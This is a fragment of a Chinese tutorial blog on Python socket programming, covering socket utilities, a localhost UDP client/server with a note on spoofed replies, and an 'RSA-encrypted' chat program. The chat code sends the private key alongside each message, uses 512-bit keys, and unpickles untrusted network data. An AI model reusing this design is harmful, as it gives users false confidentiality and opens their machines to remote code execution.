ttl&#x3D;55 time&#x3D;34.8 ms</span><br></pre></td></tr></table></figure></li><li><p>IP地址格式转换（打包成32位二进制格式）：socket类方法inet_aton、inet_ntoa</p><ul><li><p>inet_aton()使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ip_addr =<span class="string">'127.0.0.1'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.inet_aton(ip_addr)</span><br><span class="line"><span class="string">b'\x7f\x00\x00\x01'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> binascii</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>binascii.hexlify(_)</span><br><span class="line"><span class="string">b'7f000001'</span></span><br></pre></td></tr></table></figure></li></ul><p>观察看到，转换后的32位二进制格式，并调用binasci.hexlify以16进制形式表示二进制数据</p><p>10进制结果，单个字节转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="keyword">import</span> struct</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>struct.unpack(<span class="string">'B'</span>,<span class="string">b'\x7f'</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="number">127</span></span><br></pre></td></tr></table></figure><ul><li><p>inet_ntoa()使用：32位二进制包转换为IPv4地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a的主机字节序----------网络字节序 ---------b的主机字节序&gt;&gt;&gt; ip_addr =<span class="string">'127.0.0.1'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.inet_aton(ip_addr)</span><br><span class="line"><span class="string">b'\x7f\x00\x00\x01'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.inet_ntoa(_)</span><br><span class="line"><span class="string">'127.0.0.1'</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>通过指定的端口和协议找到服务名</p><ul><li><p>socket.getservbyport()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.getservbyport(<span class="number">80</span>)</span><br><span class="line"><span class="string">'http'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.getservbyport(<span class="number">53</span>)</span><br><span class="line"><span class="string">'domain'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.getservbyport(<span class="number">25</span>)</span><br><span class="line"><span class="string">'smtp'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.getservbyport(<span class="number">21</span>)</span><br><span class="line"><span class="string">'ftp'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.getservbyport(<span class="number">3306</span>)</span><br><span class="line"><span class="string">'mysql'</span></span><br></pre></td></tr></table></figure></li><li><p>socket.getservbyname() ：通过服务名获取端口</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.getservbyname(<span class="string">'ssh'</span>)</span><br><span class="line"><span class="number">22</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.getservbyname(<span class="string">'http'</span>)</span><br><span class="line"><span class="number">80</span></span><br></pre></td></tr></table></figure><p>linux系统中，etc/services文件中可查看相关服务和端口</p></li><li><p>主机字节序和网络字节序之间的转换</p><p>不同主机a，b之间通信，数据格式需转换</p><p>a的固有数据存储——-标准化——–转化成b的固有格式</p><p>也即为：</p><p>==a的主机字节序———-网络字节序 ———b的主机字节序==</p><ul><li><p>主机字节序</p><p>主机内部，内存中数据的处理方式，可以分为两种：</p><ul><li><p>大端字节序：按照内存的增长方向，高位数据存储在高位内存中</p></li><li><p>小端字节序：按照内存的增长方向，高位数据存储在低位内存中</p><p><img src="python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B01-socket-udp-tcp-rsa%E5%8A%A0%E5%AF%86%E7%9A%84%E5%85%A8%E5%8F%8C%E5%B7%A5%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B0%8F%E7%AB%AF.png" alt=""></p></li></ul></li><li><p>socket.ntohl()、socket.htonl()、ntohs()、htons()</p></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>data = <span class="number">1234</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.htonl(data)</span><br><span class="line"><span class="number">3523477504</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.htons(data)</span><br><span class="line"><span class="number">53764</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.ntohl(data)</span><br><span class="line"><span class="number">3523477504</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.ntohs(data)</span><br><span class="line"><span class="number">53764</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.ntohs(<span class="number">53764</span>)</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure><ul><li><p>设定并获取默认的套接字超时时间</p><ul><li><p>socket.gettimeout()、socket.settimeout()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = socket.socket()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.gettimeout()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.settimeout(<span class="number">100</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.gettimeout()</span><br><span class="line"><span class="number">100.0</span></span><br></pre></td></tr></table></figure><p>默认套接字超时时间为0</p></li></ul></li><li><p>套接字错误异常处理</p><ul><li>try…except  套接字异常类型 as 参数…</li></ul></li><li><p>argparse：命令项选项与参数解析的模块</p><ul><li>parser=argparse.ArgumentParser()：创建解析对象</li><li>parser.add_argument()：向对象中添加关注的命令行参数和选项</li><li>given_args = parser.parse_args()：对象解析</li></ul></li><li><p>套接字发送和接收的缓冲区大小修改</p><ul><li>socket中getsockopt()、setsockopt()方法</li></ul></li><li><p>套接字阻塞模式和非阻塞模式</p><ul><li>s= socket.socket()</li><li>s.setblocking(1)：设为阻塞模式</li><li>s.setblocking(0)：设为非阻塞模式</li></ul><p>默认情况下，TCP套接字处于阻塞模式</p></li></ul><h4 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h4><ul><li><p>多路复用：允许多个会话共享同一介质或机制的一种解决方案</p></li><li><p>UDP支持多路复用：UDP协议提供端口号，用于对目标为同一机器上不同服务的多个数据包进行适当的多路分解</p></li><li><p>TCP：多路复用、可靠传输</p></li><li><p>UDP机制：仅使用IP地址和端口进行标识，以此将数据包发送至目标地址</p></li><li><p>使用自环接口的UDP服务器和 客户端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># UDP client and server on localhost</span></span><br><span class="line"><span class="comment"># 814udp_local.py </span></span><br><span class="line"><span class="keyword">import</span> argparse, socket</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">MAX_BYTES = <span class="number">65535</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># server</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server</span><span class="params">(port)</span>:</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">    sock.bind((<span class="string">'127.0.0.1'</span>,port))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># getsockname()返回sock示例对象的（地址，端口)</span></span><br><span class="line">    print(<span class="string">"Listening at &#123;&#125;"</span>.format(sock.getsockname()))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data, address = sock.recvfrom(MAX_BYTES)</span><br><span class="line">        text = data.decode(<span class="string">'ascii'</span>)</span><br><span class="line">        </span><br><span class="line">        print(<span class="string">"The client at &#123;&#125; says &#123;!r&#125;"</span>.format(address,text))</span><br><span class="line"></span><br><span class="line">        text = <span class="string">'Your data was &#123;&#125; bytes long '</span>.format(len(data))</span><br><span class="line">        data = text.encode(<span class="string">'ascii'</span>)</span><br><span class="line">        sock.sendto(data,address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client</span><span class="params">(port)</span>:</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    text = <span class="string">'The time is &#123;&#125;'</span>.format(datetime.now())</span><br><span class="line">    data = text.encode(<span class="string">'ascii'</span>)</span><br><span class="line">   </span><br><span class="line">    sock.sendto(data,(<span class="string">'127.0.0.1'</span>,port))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># sock.getsockname()获取当前进程的（地址，端口）元组信息</span></span><br><span class="line">    print(<span class="string">'The OS assigned me the address &#123;&#125;'</span>.format(sock.getsockname()))</span><br><span class="line">    data, address = sock.recvfrom(MAX_BYTES)</span><br><span class="line"></span><br><span class="line">    text = data.decode()</span><br><span class="line">    <span class="comment"># format格式化字符串</span></span><br><span class="line">    print(<span class="string">'The server &#123;&#125; replied &#123;!r&#125;'</span>.format(address,text))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># 字典</span></span><br><span class="line">    choices = &#123;<span class="string">'client'</span>:client,<span class="string">'server'</span>:server&#125;</span><br><span class="line">    <span class="comment"># 创建参数解析对象</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Send and receive UDP locally'</span>)</span><br><span class="line">    <span class="comment">#添加要解析的参数</span></span><br><span class="line">    parser.add_argument(<span class="string">'role'</span>,choices=choices,help =<span class="string">'which role to play'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>,metavar=<span class="string">'PORT'</span>,type=int,default=<span class="number">1060</span>,help=<span class="string">'UDP port (default 1060)'</span>)</span><br><span class="line">    <span class="comment"># 参数解析</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 调用服务端或客户端函数</span></span><br><span class="line">    function = choices[args.role]</span><br><span class="line">    function(args.p)</span><br></pre></td></tr></table></figure><ul><li><p>先运行服务端</p><ul><li><p>python 814udp_local.py server</p><p>结果：</p><p>Listening at (‘127.0.0.1’, 1060)<br>The client at (‘127.0.0.1’, 60945) says ‘The time is 2019-08-16 16:34:56.276877’</p></li></ul></li><li><p>再运行客户端</p><ul><li><p>python 814udp_local.py client</p><p>The OS assigned me the address (‘0.0.0.0’, 60945)<br>The server (‘127.0.0.1’, 1060) replied ‘Your data was 38 bytes long ‘</p></li></ul></li><li><p>混杂客户端与垃圾回复</p><p>814udp_local.py代码中，客户端程序存在安全隐患，如fg果服务端响应延迟一会，攻击者伪装成服务器的一个响应，客户端并没有检查是否是真正服务器的响应</p><ul><li><p>先运行服务器，再将服务器暂停，创建一个快速发送信息的响应给客户端，再==fg命令==将暂停的服务器开启</p><p><img src="python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B01-socket-udp-tcp-rsa%E5%8A%A0%E5%AF%86%E7%9A%84%E5%85%A8%E5%8F%8C%E5%B7%A5%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/%E6%B7%B7%E6%9D%82%E5%AE%A2%E6%88%B7%E7%AB%AF.png" alt=""></p></li><li><p>客户端</p><p><img src="python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B01-socket-udp-tcp-rsa%E5%8A%A0%E5%AF%86%E7%9A%84%E5%85%A8%E5%8F%8C%E5%B7%A5%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/%E6%B7%B7%E6%9D%82%E5%AE%A2%E6%88%B7%E7%AB%AF1.png" alt=""></p><p>观察到，客户端收到的数据实际上是伪装的数据，真正的服务器的响应没到客户端</p></li><li><p>混杂客户端</p><p>不考虑地址是否正确，接收并处理所有收到的数据包的网络监听客户端在技术上叫 作混杂( promiscuous )客户端</p></li></ul></li></ul></li></ul><h4 id="python-SOCKET实现RSA加密的全双工聊天程序实现"><a href="#python-SOCKET实现RSA加密的全双工聊天程序实现" class="headerlink" title="python SOCKET实现RSA加密的全双工聊天程序实现"></a>python SOCKET实现RSA加密的全双工聊天程序实现</h4><ul><li><p>题目背景</p><p>RSA加密解密是利用非对称秘钥解决传输过程中机密性的问题，将之用在聊天程序上，其中使用rsa模块，发送方生产公钥和私钥，然后使用公钥将信息加密后，利用pickle模块封装加密后的消息和私钥，然后发送给接收方，接收方同样通过pickle模块将消息进行解封，使用发送过来的私钥将消息解密，并将内容打印在屏幕上</p></li><li><p>题目要点</p><ul><li><p>传输协议：TCP套接字创建客户端和服务端_</p><p>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p></li><li><p>数据传输格式：pickle序列化数据</p><ul><li><p>pickle.dumps()序列化</p></li><li><p>pickle.loads()反序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> pickle</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>encryptdata = <span class="string">'hello'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>key = <span class="number">882321</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>message = pickle.dumps([encryptdata,key])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(message)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">bytes</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">message</span></span></span><br><span class="line"><span class="class"><span class="title">b</span>'\<span class="title">x80</span>\<span class="title">x03</span>]<span class="title">q</span>\<span class="title">x00</span><span class="params">(X\x05\x00\x00\x00helloq\x01J\x91v\r\x00e.<span class="string">'</span></span></span></span><br><span class="line"><span class="class"><span class="params"><span class="string">&gt;&gt;&gt; origndata = pickle.loads(message)</span></span></span></span><br><span class="line"><span class="class"><span class="params"><span class="string">&gt;&gt;&gt; origndata</span></span></span></span><br><span class="line"><span class="class"><span class="params"><span class="string">['</span>hello<span class="string">', 882321]</span></span></span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>数据加密方式：RSA加解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;data = <span class="string">'hello'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> rsa</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(PubKey,PrivateKey) = rsa.newkeys(<span class="number">512</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>encryptdata = rsa.encrypt(data.encode(),PubKey)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>encryptdata</span><br><span class="line"><span class="string">b'=\\\x1c\x93]^(Z/\xac\x81\xfd\xffj!\x0b:r\xb0\x1b\xf9\x97VZ\xdf\xe1\x9e2\xb4\x05G4\x01\x9f\xc8\xfd\x1e\x00\xa1\xb7\xbdU\x98\xbc\x1e5\xa1yy\xee$\xcd\xf8\x10\xf4\xba\t\x84\xba\x13\x99hs\x8d'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>decryptdata = rsa.decrypt(encryptdata,PrivateKey)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>decryptdata</span><br><span class="line"><span class="string">b'hello'</span></span><br></pre></td></tr></table></figure></li><li><p>题目图解</p></li></ul><p><img src="python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B01-socket-udp-tcp-rsa%E5%8A%A0%E5%AF%86%E7%9A%84%E5%85%A8%E5%8F%8C%E5%B7%A5%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/rsa%E5%8A%A0%E5%AF%86.png" alt=""></p></li><li><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line">PORT = <span class="number">4396</span></span><br><span class="line">BUFF = <span class="number">1024</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RsaEncrypt</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="comment"># 利用rsa产生公钥、私钥</span></span><br><span class="line">    (PubKey, PrivateKey) = rsa.newkeys(<span class="number">512</span>)</span><br><span class="line">    content = str.encode(<span class="string">'utf8'</span>)</span><br><span class="line">    <span class="comment"># 使用公钥加密</span></span><br><span class="line">    Encrypt_Str = rsa.encrypt(content, PubKey)</span><br><span class="line">    <span class="comment"># 返回加密信息和私钥</span></span><br><span class="line">    <span class="keyword">return</span> (Encrypt_Str, PrivateKey)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RsaDecrypt</span><span class="params">(str, pk)</span>:</span></span><br><span class="line">    Decrypt_Str = rsa.decrypt(str, pk)</span><br><span class="line">    Decrypt_Str_1 = Decrypt_Str.decode(<span class="string">'utf8'</span>)</span><br><span class="line">    <span class="keyword">return</span> Decrypt_Str_1</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SendMessage</span><span class="params">(Sock, test)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        SendData = input()</span><br><span class="line">        <span class="comment"># 加密要发送的数据</span></span><br><span class="line">        (encryptdata, PrivateKey) = RsaEncrypt(SendData)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 打印加密后的数据</span></span><br><span class="line">        print(<span class="string">'encrypted data is '</span> + str(encryptdata))</span><br><span class="line">       </span><br><span class="line">        <span class="comment"># pickel封装加密后的数据和私钥</span></span><br><span class="line">        Message = pickle.dumps([encryptdata, PrivateKey])</span><br><span class="line">        <span class="keyword">if</span> len(SendData) &gt; <span class="number">0</span>:</span><br><span class="line">            Sock.send(Message)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RecvMessage</span><span class="params">(Sock, test)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 接收数据</span></span><br><span class="line">        Message = Sock.recv(BUFF)</span><br><span class="line">        <span class="comment"># pickle解封数据</span></span><br><span class="line">        (recvdata, PrivateKey) = pickle.loads(Message)</span><br><span class="line">        <span class="comment"># 对加密的数据解密</span></span><br><span class="line">        decryptdata = RsaDecrypt(recvdata, PrivateKey)</span><br><span class="line">        <span class="keyword">if</span> len(Message)&gt;<span class="number">0</span>:</span><br><span class="line">            print(<span class="string">"receive message:"</span> + decryptdata)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    type = input(<span class="string">'please input server or client:'</span>)</span><br><span class="line">    <span class="keyword">if</span> type == <span class="string">'server'</span>:</span><br><span class="line">        <span class="comment"># 创建套接字</span></span><br><span class="line">        ServerSock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        <span class="comment"># 端口绑定</span></span><br><span class="line">        ServerSock.bind((<span class="string">'127.0.0.1'</span>,PORT))</span><br><span class="line"><span class="comment"># 服务器允许连接的个数</span></span><br><span class="line">        ServerSock.listen(<span class="number">5</span>)</span><br><span class="line">        print(<span class="string">"listening......"</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            ConSock,addr = ServerSock.accept()</span><br><span class="line">            print(<span class="string">'connection succeed'</span> + <span class="string">'\n'</span> + <span class="string">'you can chat online'</span>)</span><br><span class="line">            <span class="comment"># 多线程运用</span></span><br><span class="line">            thread_1 = threading.Thread(target = SendMessage, args = (ConSock, <span class="literal">None</span>))</span><br><span class="line">            thread_2 = threading.Thread(target = RecvMessage, args = (ConSock, <span class="literal">None</span>))</span><br><span class="line">            thread_1.start()</span><br><span class="line">            thread_2.start()</span><br><span class="line">    <span class="keyword">elif</span> type == <span class="string">'client'</span>:</span><br><span class="line">        ClientSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        ServerAddr = input(<span class="string">"please input the server's ip address:"</span>)</span><br><span class="line">        ClientSock.connect((ServerAddr, PORT))</span><br><span class="line">        print(<span class="string">'connection succeed, chat start!'</span>)</span><br><span class="line">        thread_3 = threading.Thread(target = SendMessage, args = (ClientSock, <span class="literal">None</span>))</span><br><span class="line">        thread_4 = threading.Thread(target = RecvMessage, args = (ClientSock, <span class="literal">None</span>))</span><br><span class="line">        thread_3.start()</span><br><span class="line">        thread_4.start()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li><li><p>结果演示</p><ul><li><p>先启动server进行监听</p><p><img src="https://cdn.jsdelivr.net/gh/YuHaoLoveByCats/ImgHosting/Images/A03/serverlisten.png" alt=""></p></li><li><p>启动客户端连接server</p><p><img src="https://cdn.jsdelivr.net/gh/YuHaoLoveByCats/ImgHosting/Images/A03/client.png" alt=""></p></li><li><p>客户端向服务器发送消息</p><p><img src="https://cdn.jsdelivr.net/gh/YuHaoLoveByCats/ImgHosting/Images/A03/clientsend.png" alt=""></p></li><li><p>服务器端接收到消息，并将消息打印在屏幕上</p><p><img src="https://cdn.jsdelivr.net/gh/YuHaoLoveByCats/ImgHosting/Images/A03/serversend.png" alt=""></p></li></ul></li><li><p>分析</p><p>综上，该程序利用的是TCP套接字保证了传输的可靠性，并利用多线程进行信息交互，pickle封装数据，rsa产生公钥、私钥、和加/解密等操作</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> python网络编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python网络编程 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
